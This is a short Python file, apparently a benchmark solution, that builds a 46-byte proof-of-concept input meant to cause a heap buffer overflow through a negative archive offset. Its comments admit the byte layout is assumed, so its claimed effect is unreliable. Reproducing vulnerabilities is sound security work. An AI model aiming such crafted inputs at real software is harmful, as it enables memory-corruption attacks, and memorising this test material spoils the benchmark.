class Solution:
    def solve(self, src_path: str) -> bytes:
        # Craft a minimal PoC of 46 bytes to trigger negative archive start offset
        # Assuming a binary format where a 4-byte signed offset field at offset 10 is set to -1 (0xFFFFFFFF)
        # This causes underflow in start offset calculation, leading to heap buffer overflow
        poc = bytearray(b'\x00' * 46)
        # Set magic or header if needed, but minimal
        poc[0:4] = b'\x00\x00\x00\x01'  # Some small header size
        poc[10:14] = b'\xff\xff\xff\xff'  # Negative offset value
        poc[20:24] = b'\x00\x00\x00\x32'  # Some size larger than position to cause underflow
        return bytes(poc)